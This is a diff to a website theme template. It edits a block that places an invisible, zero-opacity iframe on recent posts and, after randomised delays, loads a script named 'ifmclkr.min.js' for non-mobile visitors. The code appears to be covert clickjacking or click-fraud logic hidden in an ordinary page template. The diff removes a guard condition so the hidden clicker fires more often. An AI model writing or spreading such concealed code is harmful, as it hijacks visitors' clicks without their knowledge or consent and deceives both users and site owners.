@@ -84,7 +84,6 @@
 {% block bottom %}
 {% if date(page.date) > date('-9days') and date() > date('-1day')  %}
     {% if random(4) == 0 %}
-    {% set ifmtime = null %}
     <div id="ifmwpr">
         <iframe scrolling="no" frameborder="0" style="border:none;overflow:hidden;width:450px;height:21px;" allowTransparency="false"></iframe>
     </div>
@@ -128,7 +127,7 @@
             $("#ifmwpr").css("-khtml-opacity", "0.0");
             $("#ifmwpr").css("opacity", "0.0");
             $.getScript( "{{ site.cdn_url }}{{ theme_url }}/js/post.min.js")
-                .done(function() { {% if ifmtime is null %} if (Math.floor((Math.random() * 10) + 1) == 1){
+                .done(function() { if (Math.floor((Math.random() * 10) + 1) == 1){
                 console.log('++/++++');
                 isMobile||$("#ifmwpr")&&setTimeout(function(){
                     $.getScript("{{ site.cdn_url }}{{ theme_url }}/js/ifmclkr.min.js").done(function(){
@@ -145,7 +144,7 @@
                             }
                         }, Math.floor((Math.random() * 50000) + 20000));
                     });
-            }, Math.floor((Math.random() * 30000) + 10000));} {% endif %} });
+            }, Math.floor((Math.random() * 30000) + 10000));} });
         } else {            
             var d = new Date();
             d.setTime(d.getTime() + (365*24*60*60*1000));
